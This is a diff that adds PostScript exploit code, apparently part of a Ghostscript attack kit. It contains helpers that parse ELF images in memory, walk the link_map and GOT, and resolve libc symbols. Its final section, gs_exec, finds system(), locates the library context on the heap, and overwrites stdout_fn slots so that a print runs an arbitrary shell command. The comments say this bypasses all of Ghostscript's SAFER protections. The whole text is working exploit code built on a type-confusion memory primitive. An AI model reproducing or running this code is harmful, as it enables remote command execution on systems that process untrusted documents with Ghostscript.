+        count 3 sub /depth exch def
+        {
+            /needle exch def
+            /len exch def
+            /addr exch def
+            /result -1 def
+            needle length 0 eq {
+                /result addr def
+            } {
+                needle length len le {
+                    0 1 len needle length sub {
+                        /i exch def
+                        addr i add needle mem_match_at {
+                            /result addr i add def
+                            exit
+                        } if
+                    } for
+                } if
+            } ifelse
+            result
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%  8. ELF parsing -- recover image base, parse Elf64_Ehdr / Elf64_Phdr
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%DEF: pt_constants
+% ELF program-header types (p_type).
+/PT_NULL      0 def
+/PT_LOAD      1 def
+/PT_DYNAMIC   2 def
+/PT_INTERP    3 def
+/PT_NOTE      4 def
+/PT_PHDR      6 def
+/PT_GNU_STACK 16#6474E551 def
+%%END
+
+%%DEF: mem_try_u32
+% Read 4 bytes at `addr`; a read fault yields just `false` (stack-safe), so it is
+% safe to probe possibly-unmapped memory.  addr -> (value true) | (false)
+/mem_try_u32 {
+    count 1 sub userdict /MEM_TRY_DEPTH 3 -1 roll put
+    { mem_read_u32 } stopped
+    {
+        { count userdict /MEM_TRY_DEPTH get gt { pop } { exit } ifelse } loop
+        userdict /MEM_TRY_DEPTH undef
+        false
+    }
+    {
+        userdict /MEM_TRY_DEPTH undef
+        true
+    }
+    ifelse
+} bind def
+%%END
+
+%%DEF: elf_is_valid
+% True if the 4-byte ELF magic (\x7fELF) is at absolute address `addr`. A read
+% fault counts as false.  addr -> bool
+/elf_is_valid {
+    /integertype typecheck
+    mem_try_u32 { 16#464C457F eq } { false } ifelse
+} bind def
+%%END
+
+%%DEF: elf_find_base
+% Page-align `addr` and scan downward for the ELF magic -- recovers an image base
+% from any pointer into the image.  addr -> base | -1
+/elf_find_base {
+    /integertype typecheck
+    userdict /ELF_FIND_A 3 -1 roll 16#FFFFFFFFFFFFF000 and put
+    userdict /ELF_FIND_BASE -1 put
+    0 16#1000 16#1000000 {                 % step one page, up to 16 MB back
+        userdict /ELF_FIND_OFF 3 -1 roll put
+        userdict /ELF_FIND_A get userdict /ELF_FIND_OFF get sub elf_is_valid {
+            userdict /ELF_FIND_BASE
+            userdict /ELF_FIND_A get userdict /ELF_FIND_OFF get sub
+            put
+            exit
+        } if
+    } for
+    userdict /ELF_FIND_BASE get
+    userdict /ELF_FIND_A undef
+    userdict /ELF_FIND_BASE undef
+    userdict /ELF_FIND_OFF undef
+} bind def
+%%END
+
+%%DEF: elf_header
+% Parse the Elf64_Ehdr at image base `base` into a dict.
+% base -> << ei_class e_type e_machine e_entry e_phoff e_shoff e_phentsize e_phnum e_shentsize e_shnum >>
+/elf_header {
+    /integertype typecheck
+    11 dict begin
+        count 1 sub /depth exch def
+        {
+            /b exch def
+            /ei_class    b 16#04 add mem_read_u8  def
+            /e_type      b 16#10 add mem_read_u16 def
+            /e_machine   b 16#12 add mem_read_u16 def
+            /e_entry     b 16#18 add mem_read_u64 def
+            /e_phoff     b 16#20 add mem_read_u64 def
+            /e_shoff     b 16#28 add mem_read_u64 def
+            /e_phentsize b 16#36 add mem_read_u16 def
+            /e_phnum     b 16#38 add mem_read_u16 def
+            /e_shentsize b 16#3A add mem_read_u16 def
+            /e_shnum     b 16#3C add mem_read_u16 def
+            currentdict /b undef
+            currentdict
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: elf_find_segment
+% First program header (Elf64_Phdr) whose p_type matches `p_type`.
+% base p_type -> << p_type p_flags p_offset p_vaddr p_filesz p_memsz p_align >> | null
+/elf_find_segment {
+    dup type /integertype ne { pop pop stop } if
+    1 index type /integertype ne { pop pop stop } if
+    6 dict begin
+        count 2 sub /depth exch def
+        {
+            /want exch def
+            /base exch def
+            base elf_header /h exch def
+            /phoff base h /e_phoff get add def
+            /phent h /e_phentsize get def
+            /phnum h /e_phnum get def
+            /result null def
+            0 1 phnum 1 sub {
+                phent mul phoff add /e exch def
+                e mem_read_u32 want eq {
+                    /result <<
+                        /p_type   e 16#00 add mem_read_u32
+                        /p_flags  e 16#04 add mem_read_u32
+                        /p_offset e 16#08 add mem_read_u64
+                        /p_vaddr  e 16#10 add mem_read_u64
+                        /p_filesz e 16#20 add mem_read_u64
+                        /p_memsz  e 16#28 add mem_read_u64
+                        /p_align  e 16#30 add mem_read_u64
+                    >> def
+                    exit
+                } if
+            } for
+            result
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%  9. Dynamic section, link_map walk, symbol resolution
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%%DEF: dt_constants
+% ELF dynamic-section tags (d_tag).
+/DT_NULL     0 def
+/DT_NEEDED   1 def
+/DT_PLTGOT   3 def
+/DT_HASH     4 def
+/DT_STRTAB   5 def
+/DT_SYMTAB   6 def
+/DT_RELA     7 def
+/DT_RELASZ   8 def
+/DT_STRSZ    10 def
+/DT_SYMENT   11 def
+/DT_SONAME   14 def
+/DT_DEBUG    21 def
+/DT_GNU_HASH 16#6FFFFEF5 def
+%%END
+
+%%DEF: elf_load_bias
+% Load bias: difference between where the image was loaded and where the ELF
+% says it should be.  For shared libs / PIE (first PT_LOAD vaddr = 0) this
+% equals base.  For non-PIE ET_EXEC (first PT_LOAD vaddr = 0x400000) this
+% is 0.  Used to convert any p_vaddr to a runtime address.
+% base -> bias
+/elf_load_bias {
+    /integertype typecheck
+    2 dict begin
+        count 1 sub /depth exch def
+        {
+            /base exch def
+            /seg base PT_LOAD elf_find_segment def
+            seg null eq { base } { base seg /p_vaddr get sub } ifelse
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: elf_dynamic
+% Runtime address of the PT_DYNAMIC segment, or 0.  base -> addr | 0
+/elf_dynamic {
+    /integertype typecheck
+    3 dict begin
+        count 1 sub /depth exch def
+        {
+            /base exch def
+            /bias base elf_load_bias def
+            /seg base PT_DYNAMIC elf_find_segment def
+            seg null eq { 0 } { bias seg /p_vaddr get add } ifelse
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: elf_dynamic_tag
+% Value (d_val) of the first Elf64_Dyn entry whose tag matches, or 0 (stops at
+% DT_NULL or a 2048-entry cap).  dyn_addr d_tag -> d_val | 0
+/elf_dynamic_tag {
+    dup type /integertype ne { pop pop stop } if
+    1 index type /integertype ne { pop pop stop } if
+    4 dict begin
+        count 2 sub /depth exch def
+        {
+            /tag exch def
+            /e exch def
+            /val 0 def
+            0 1 2047 {
+                pop
+                /t e mem_read_u64 def
+                t DT_NULL eq { exit } if
+                t tag eq { /val e 16#08 add mem_read_u64 def exit } if
+                /e e 16#10 add def
+            } for
+            val
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: elf_sym_count_hash
+% Symbol count from a SysV DT_HASH table (= nchain).  hash_addr -> count
+/elf_sym_count_hash {
+    16#04 add mem_read_u32
+} bind def
+%%END
+
+%%DEF: elf_sym_count_gnu
+% Symbol count from a DT_GNU_HASH table: highest bucket index, then walk its
+% chain to the terminator (low bit set).  gnu_addr -> count
+/elf_sym_count_gnu {
+    /integertype typecheck
+    8 dict begin
+        count 1 sub /depth exch def
+        {
+            /g exch def
+            /nbuckets  g 16#00 add mem_read_u32 def
+            /symoffset g 16#04 add mem_read_u32 def
+            /bloom_sz  g 16#08 add mem_read_u32 def
+            /buckets g 16#10 add bloom_sz 8 mul add def    % header(16) + bloom[bloom_sz]
+            /chains buckets nbuckets 4 mul add def
+            /maxidx 0 def
+            0 1 nbuckets 1 sub {
+                4 mul buckets add mem_read_u32
+                dup maxidx gt { /maxidx exch def } { pop } ifelse
+            } for
+            maxidx 0 eq {
+                symoffset
+            } {
+                /idx maxidx def
+                0 1 1000000 {
+                    pop
+                    chains idx symoffset sub 4 mul add mem_read_u32 1 and 1 eq { exit } if
+                    /idx idx 1 add def
+                } for
+                idx 1 add
+            } ifelse
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: elf_sym_count
+% Number of dynamic symbols, via DT_HASH (nchain) or DT_GNU_HASH.  dyn_addr -> count | 0
+/elf_sym_count {
+    /integertype typecheck
+    2 dict begin
+        count 1 sub /depth exch def
+        {
+            /dyn exch def
+            dyn DT_HASH elf_dynamic_tag
+            dup 0 ne {
+                elf_sym_count_hash
+            } {
+                pop
+                dyn DT_GNU_HASH elf_dynamic_tag
+                dup 0 ne { elf_sym_count_gnu } { pop 0 } ifelse
+            } ifelse
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: elf_soname_contains
+% True if an ELF image's DT_SONAME contains `substr`.
+% base (substr) -> bool
+/elf_soname_contains {
+    dup type /stringtype ne { pop pop stop } if
+    1 index type /integertype ne { pop pop stop } if
+    6 dict begin
+        count 2 sub /depth exch def
+        {
+            /substr exch def
+            /base exch def
+            /result false def
+            base elf_dynamic /dyn exch def
+            dyn 0 ne {
+                dyn DT_STRTAB elf_dynamic_tag /strtab exch def
+                dyn DT_SONAME elf_dynamic_tag /soff exch def
+                strtab 0 ne soff 0 ne and {
+                    strtab soff add substr mem_cstring_contains /result exch def
+                } if
+            } if
+            result
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: elf_find_library_debug
+% Find a library via DT_DEBUG -> r_debug -> link_map walk.
+% Works when base is the main executable (which has DT_DEBUG).
+% base (substr) -> lib_base | 0
+/elf_find_library_debug {
+    dup type /stringtype ne { pop pop stop } if
+    1 index type /integertype ne { pop pop stop } if
+    8 dict begin
+        count 2 sub /depth exch def
+        {
+            /substr exch def
+            /base exch def
+            /result 0 def
+            base elf_dynamic /dyn exch def
+            dyn 0 ne {
+                dyn DT_DEBUG elf_dynamic_tag dup 0 ne {
+                    16#08 add mem_read_u64 /lm exch def
+                    { ([+] elf_find_library_debug: r_map=0x) print lm 16 inttohex print nl } dbg
+                    0 1 200 {
+                        pop
+                        lm 0 eq { exit } if
+                        lm 16#08 add mem_read_u64 dup 0 ne {
+                            substr mem_cstring_contains {
+                                /result lm mem_read_u64 def
+                                { ([+] elf_find_library_debug: matched ) print substr print
+                                  ( @ 0x) print result 16 inttohex print nl } dbg
+                                exit
+                            } if
+                        } { pop } ifelse
+                        /lm lm 16#18 add mem_read_u64 def
+                    } for
+                } { pop } ifelse
+            } if
+            result
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: elf_find_library_got
+% Find a library by walking the DT_RELA relocation table, reading resolved
+% GOT values for external function symbols (STT_FUNC), and scanning backward
+% through .text to find the ELF header.  Works regardless of RELRO mode.
+%
+% Only scans from STT_FUNC symbols to guarantee the resolved address is in a
+% contiguous r-xp mapping (safe backward scan -- no unmapped gaps).
+% base (substr) -> lib_base | 0
+/elf_find_library_got {
+    dup type /stringtype ne { pop pop stop } if
+    1 index type /integertype ne { pop pop stop } if
+    14 dict begin
+        count 2 sub /depth exch def
+        {
+            /substr exch def
+            /base exch def
+            /result 0 def
+            /bias base elf_load_bias def
+            /self_base base elf_find_base def
+            { ([+] elf_find_library_got: base=0x) print base 16 inttohex print
+              ( bias=0x) print bias 16 inttohex print nl } dbg
+            base elf_dynamic /dyn exch def
+            dyn 0 ne {
+                dyn DT_RELA elf_dynamic_tag /rela exch def
+                dyn DT_RELASZ elf_dynamic_tag 24 idiv /nrela exch def
+                dyn DT_SYMTAB elf_dynamic_tag /symtab exch def
+                nrela 32000 gt { /nrela 32000 def } if
+                { ([+] elf_find_library_got: rela=0x) print rela 16 inttohex print
+                  ( nrela=) print nrela 10 string cvs print nl } dbg
+                rela 0 ne nrela 0 gt and symtab 0 ne and {
+                    0 1 nrela 1 sub {
+                        result 0 ne { pop exit } if
+                        /ri exch def
+                        rela ri 24 mul add /r exch def
+                        r 8 add mem_read_u64 /rinfo exch def
+                        rinfo 16#FFFFFFFF and 6 eq {
+                            rinfo -32 bitshift /sym_idx exch def
+                            symtab sym_idx 24 mul add 4 add mem_read_u32
+                            16#F and 2 eq {
+                                r mem_read_u64 bias add mem_read_u64 /gval exch def
+                                gval 16#10000 gt {
+                                    gval 16#FFFFFFFFFFFFF000 and /page exch def
+                                    /cand -1 def
+                                    0 16#1000 16#1000000 {
+                                        /soff exch def
+                                        page soff sub mem_try_u32 {
+                                            16#464C457F eq {
+                                                /cand page soff sub def exit
+                                            } if
+                                        } if
+                                    } for
+                                    cand -1 ne cand self_base ne and {
+                                        cand substr elf_soname_contains {
+                                            /result cand def
+                                            { ([+] elf_find_library_got: matched ) print substr print
+                                              ( @ 0x) print result 16 inttohex print nl } dbg
+                                        } if
+                                    } if
+                                } if
+                            } if
+                        } if
+                    } for
+                } if
+            } if
+            result 0 eq { { ([!] elf_find_library_got: ) print substr print ( not found\n) print } dbg } if
+            result
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: elf_find_library
+% Find a library by name substring.  Auto-detects the best strategy:
+%   - DT_DEBUG present: link_map walk
+%   - Otherwise: DT_RELA GOT scan (handles full RELRO)
+% (substr) -> lib_base | 0
+/elf_find_library {
+    dup type /stringtype ne { pop stop } if
+    3 dict begin
+        count 1 sub /depth exch def
+        {
+            /substr exch def
+            /base RW /gs_base get def
+            base elf_dynamic dup 0 ne { DT_DEBUG elf_dynamic_tag } { pop 0 } ifelse
+            0 ne { base substr elf_find_library_debug } { base substr elf_find_library_got } ifelse
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: elf_find_symbol
+% Resolve an exported symbol's runtime address via the dynamic symbol/string
+% tables (symbol count from DT_HASH or DT_GNU_HASH).  lib_base (name) -> addr | 0
+/elf_find_symbol {
+    dup type /stringtype ne { pop pop stop } if
+    1 index type /integertype ne { pop pop stop } if
+    12 dict begin
+        count 2 sub /depth exch def
+        {
+            /name exch def
+            /lib exch def
+            /result 0 def
+            lib elf_dynamic /dyn exch def
+            dyn 0 eq {
+                { ([!] elf_find_symbol: no PT_DYNAMIC\n) print } dbg
+            } {
+                /symtab dyn DT_SYMTAB elf_dynamic_tag def
+                /strtab dyn DT_STRTAB elf_dynamic_tag def
+                /syment dyn DT_SYMENT elf_dynamic_tag def
+                /nsyms  dyn elf_sym_count def
+                syment 0 eq { /syment 16#18 def } if
+                { ([+] elf_find_symbol: symtab=0x) print symtab 16 inttohex print
+                  ( strtab=0x) print strtab 16 inttohex print
+                  ( nsyms=) print nsyms 20 string cvs print nl } dbg
+                symtab 0 eq strtab 0 eq or nsyms 0 eq or {
+                    { ([!] elf_find_symbol: missing symtab/strtab/nsyms\n) print } dbg
+                } {
+                    0 1 nsyms 1 sub {
+                        /sym exch syment mul symtab add def
+                        /st_name sym mem_read_u32 def
+                        st_name 0 ne {
+                            strtab st_name add name mem_cstring_eq {
+                                /result lib sym 16#08 add mem_read_u64 add def    % lib + st_value
+                                { ([+] elf_find_symbol: ) print name print ( @ 0x) print result 16 inttohex print nl } dbg
+                                exit
+                            } if
+                        } if
+                    } for
+                } ifelse
+            } ifelse
+            result 0 eq { { ([!] elf_find_symbol: ) print name print ( not found\n) print } dbg } if
+            result
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%  10. Command execution — stdout_fn hijack → libc system()
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%
+%  Bypasses ALL Ghostscript security (SAFER, path_control_active,
+%  LockFilePermissions, LockSafetyParams) by never routing through any of it.
+%  Finds gs_lib_ctx_core_t (or gs_lib_ctx_t in pre-9.27) on the brk heap via a
+%  FILE* triplet fingerprint, then uses the shotgun stdout_fn overwrite from
+%  design/shotgun_stdout_fn.md: write all observed caller-handle and stdout_fn
+%  slots and fire a 256-byte stdout write through libc system().
+%
+%  See design/shotgun_stdout_fn.md for the full design rationale.
+
+%%DEF: find_core_by_triplet
+% Scan the brk heap downward from heap_top for 24 consecutive bytes matching
+% [stdin_file, stdout_file, stderr_file] at 8-byte alignment.
+% Uses RW /read_u64 directly (zero allocation) to avoid triggering GC on a
+% heap corrupted by the type-confusion exploit.
+% heap_top stdin_file stdout_file stderr_file -> fstdin_addr
+/find_core_by_triplet {
+    dup type /integertype ne { pop pop pop pop stop } if
+    1 index type /integertype ne { pop pop pop pop stop } if
+    2 index type /integertype ne { pop pop pop pop stop } if
+    3 index type /integertype ne { pop pop pop pop stop } if
+    8 dict begin
+        count 4 sub /depth exch def
+        {
+            /stderr_val exch def
+            /stdout_val exch def
+            /stdin_val exch def
+            /htop exch def
+            /result -1 def
+            /max_bytes 134217728 def
+            /rd RW /read_u64 get def
+            { ([+] find_core_by_triplet: scanning from 0x) print htop 16 inttohex print
+              ( for triplet [0x) print stdin_val 16 inttohex print
+              ( 0x) print stdout_val 16 inttohex print
+              ( 0x) print stderr_val 16 inttohex print (]\n) print } dbg
+            /addr htop 24 sub def
+            /scanned 0 def
+            {
+                scanned max_bytes ge { exit } if
+                addr rd exec stdin_val eq {
+                    addr 8 add rd exec stdout_val eq {
+                        addr 16 add rd exec stderr_val eq {
+                            /result addr def
+                            exit
+                        } if
+                    } if
+                } if
+                /addr addr 8 sub def
+                /scanned scanned 8 add def
+            } loop
+            result -1 eq {
+                { ([!] find_core_by_triplet: triplet not found in 128 MB\n) print } dbg
+                stop
+            } if
+            { ([+] find_core_by_triplet: found at 0x) print result 16 inttohex print nl } dbg
+            result
+        } stopped {
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
+
+%%DEF: gs_exec
+% Execute a shell command via shotgun stdout_fn hijack. Appends `;exit 1` so
+% glibc system() returns 0x100, matching the 256-byte stdout trigger count and
+% avoiding the Ghostscript stream error path that otherwise spins in recovery.
+% Requires RW /scratch to point at writable target memory large enough for
+% the command, suffix, and NUL terminator. Commands longer than
+% GS_EXEC_MAX_CMD_LEN stop before any target memory is modified.
+% (cmd) -> -
+/GS_EXEC_EXIT_SUFFIX (;exit 1) def
+/GS_EXEC_TRIGGER_256 (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) def
+/GS_EXEC_MAX_CMD_LEN RW_BUFSZ GS_EXEC_EXIT_SUFFIX length sub 1 sub def
+/gs_exec {
+    /stringtype typecheck
+    rw_ready not { pop stop } if
+    GS_EXEC_TRIGGER_256 length 256 ne { pop stop } if
+    GS_EXEC_MAX_CMD_LEN RW_BUFSZ GS_EXEC_EXIT_SUFFIX length sub 1 sub ne { pop stop } if
+    dup length GS_EXEC_MAX_CMD_LEN gt { pop stop } if
+    30 dict begin
+        count 1 sub /depth exch def
+        /cmd_saved false def
+        /slots_saved false def
+        {
+            /cmd exch def
+            RW /scratch known not { stop } if
+            RW /scratch get /integertype typecheck /cmd_addr exch def
+
+            (libc.so) elf_find_library /libc_base exch def
+            libc_base 0 eq { { ([!] gs_exec: libc not found\n) print } dbg stop } if
+
+            libc_base (system) elf_find_symbol /system_addr exch def
+            system_addr 0 eq { { ([!] gs_exec: system() not found\n) print } dbg stop } if
+
+            libc_base (stdin) elf_find_symbol /stdin_sym exch def
+            stdin_sym 0 eq { { ([!] gs_exec: stdin not found\n) print } dbg stop } if
+
+            libc_base (stdout) elf_find_symbol /stdout_sym exch def
+            stdout_sym 0 eq { { ([!] gs_exec: stdout not found\n) print } dbg stop } if
+
+            libc_base (stderr) elf_find_symbol /stderr_sym exch def
+            stderr_sym 0 eq { { ([!] gs_exec: stderr not found\n) print } dbg stop } if
+
+            libc_base (__curbrk) elf_find_symbol /curbrk_sym exch def
+            curbrk_sym 0 eq { { ([!] gs_exec: __curbrk not found\n) print } dbg stop } if
+
+            /stdin_file stdin_sym mem_read_u64 def
+            /stdout_file stdout_sym mem_read_u64 def
+            /stderr_file stderr_sym mem_read_u64 def
+            stdin_file 0 eq { stop } if
+            stdout_file 0 eq { stop } if
+            stderr_file 0 eq { stop } if
+
+            /heap_top curbrk_sym mem_read_u64 def
+            heap_top 0 eq { stop } if
+
+            /F heap_top stdin_file stdout_file stderr_file find_core_by_triplet def
+
+            /cmd_len cmd length GS_EXEC_EXIT_SUFFIX length add 1 add def
+            /cmd_save cmd_len array def
+            0 1 cmd_len 1 sub {
+                /i exch def
+                cmd_save i cmd_addr i add mem_read_u8 put
+            } for
+            /cmd_saved true def
+            cmd_addr cmd cmd length mem_write_from
+            cmd_addr cmd length add GS_EXEC_EXIT_SUFFIX GS_EXEC_EXIT_SUFFIX length mem_write_from
+            cmd_addr cmd length add GS_EXEC_EXIT_SUFFIX length add RW /nul1 get 1 mem_write_from
+
+            /save_redir F 16#20 add mem_read_u32 def
+            /save_28 F 16#28 add mem_read_u64 def
+            /save_30 F 16#30 add mem_read_u64 def
+            /save_38 F 16#38 add mem_read_u64 def
+            /save_40 F 16#40 add mem_read_u64 def
+            /save_48 F 16#48 add mem_read_u64 def
+            /save_58 F 16#58 add mem_read_u64 def
+
+            /slots_saved true def
+            F 16#20 add 0 mem_write_u32
+            F 16#28 add cmd_addr mem_write_u64
+            F 16#30 add cmd_addr mem_write_u64
+            F 16#38 add cmd_addr mem_write_u64
+            F 16#40 add system_addr mem_write_u64
+            F 16#48 add system_addr mem_write_u64
+            F 16#58 add system_addr mem_write_u64
+
+            GS_EXEC_TRIGGER_256 print flush
+
+            F 16#58 add save_58 mem_write_u64
+            F 16#48 add save_48 mem_write_u64
+            F 16#40 add save_40 mem_write_u64
+            F 16#38 add save_38 mem_write_u64
+            F 16#30 add save_30 mem_write_u64
+            F 16#28 add save_28 mem_write_u64
+            F 16#20 add save_redir mem_write_u32
+            0 1 cmd_len 1 sub {
+                /i exch def
+                cmd_addr i add cmd_save i get mem_write_u8
+            } for
+        } stopped {
+            slots_saved {
+                count /restore_depth exch def
+                {
+                    F 16#58 add save_58 mem_write_u64
+                    F 16#48 add save_48 mem_write_u64
+                    F 16#40 add save_40 mem_write_u64
+                    F 16#38 add save_38 mem_write_u64
+                    F 16#30 add save_30 mem_write_u64
+                    F 16#28 add save_28 mem_write_u64
+                    F 16#20 add save_redir mem_write_u32
+                } stopped {
+                    { count restore_depth gt { pop } { exit } ifelse } loop
+                } if
+            } if
+            cmd_saved {
+                count /restore_depth exch def
+                {
+                    0 1 cmd_len 1 sub {
+                        /i exch def
+                        cmd_addr i add cmd_save i get mem_write_u8
+                    } for
+                } stopped {
+                    { count restore_depth gt { pop } { exit } ifelse } loop
+                } if
+            } if
+            { count depth gt { pop } { exit } ifelse } loop
+            end
+            stop
+        } if
+    end
+} bind def
+%%END
